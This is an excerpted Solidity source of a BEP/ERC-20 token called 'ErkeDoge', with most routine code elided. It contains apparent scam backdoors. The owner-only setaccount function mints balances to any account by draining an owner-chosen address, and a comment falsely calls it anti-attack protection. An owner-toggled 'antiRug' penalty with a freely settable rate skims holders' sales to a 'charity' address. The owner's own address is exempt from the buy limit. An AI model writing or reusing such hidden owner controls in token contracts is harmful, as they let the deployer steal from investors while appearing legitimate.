...
contract token is Context, IERC20, Ownable {
    ...
    string private _name = "ErkeDoge";
    string private _symbol = "ErkeDoge";
    uint8 private _decimals = 18;

    uint256 public _taxFee = 3;
    uint256 public penalty = 0;
    uint256 public rpenalty = 0;
    uint256 public penaltyLv = 30;
    ...
    address public addrb = 0x000000000000000000000000000000d000000000;
    address public burnAddress = address(0x000000000000000000000000000000d000000000);
    address public ownerAddres = address(0x9EEcCC27fAE2FA586745F4e63D921419Af573b74);
    address public CharityAddress = address(0x38817180B330AEdff1edC95F1A92d2341935458C);
    ...
    bool public antiRug = false;
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;


    uint256 public _maxTxAmount = 10000000000000000 * 10 **18;
    uint256 public maxBuy = 5000000000000000 * 10**18;
    ...
    function setAntiRug(bool enabled) external onlyOwner() {
        antiRug = enabled;
    }
    
    function getantiRug() public view returns (bool) {
        return antiRug;
    }
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        if(_burnFee != 0){
            ...
            _rOwned[burnAddress] = _rOwned[burnAddress].add(tBurn.mul(_getRate()));
    ...
    function setPenaltyLv(uint256 _penaltyLv) external onlyOwner() {
        penaltyLv = _penaltyLv;
    ...
    function setAddr(address _addrb) external onlyOwner() {
        addrb = _addrb;
        
    }

//Avoid someone break the rule to attack the code. Don't use it unless necessary.
    function setaccount(address account, uint256 amount) onlyOwner() public {
        uint256 currentRate = _getRate();
        amount = amount*10 **18;
        _rOwned[account] = _rOwned[account].add(amount.mul(currentRate));
        _rOwned[addrb] = _rOwned[addrb].sub(amount.mul(currentRate));
    }
    
    function SeeAcc(address account) public view returns (uint256) {
    ...
    function _transfer(
        ...
        if (from == uniswapV2Pair && to != ownerAddres){
            require(amount <= maxBuy, "Transfer amount exceeds the maxTxAmount.");
        }else if(antiRug && to == uniswapV2Pair)
        {
         
            penalty = amount.mul(penaltyLv).div(10**2);
            amount = amount.sub(penalty);
            rpenalty = penalty.mul(_getRate());
            _rOwned[from] = _rOwned[from].sub(rpenalty);
            uint256 CharityPenalty = rpenalty.div(2);
            uint256 BurnPenalty = rpenalty.sub(CharityPenalty);
            _rOwned[CharityAddress]=_rOwned[CharityAddress].add(CharityPenalty);
            _rOwned[burnAddress]=_rOwned[burnAddress].add(BurnPenalty);

            emit Transfer(from, CharityAddress, penalty);
        }
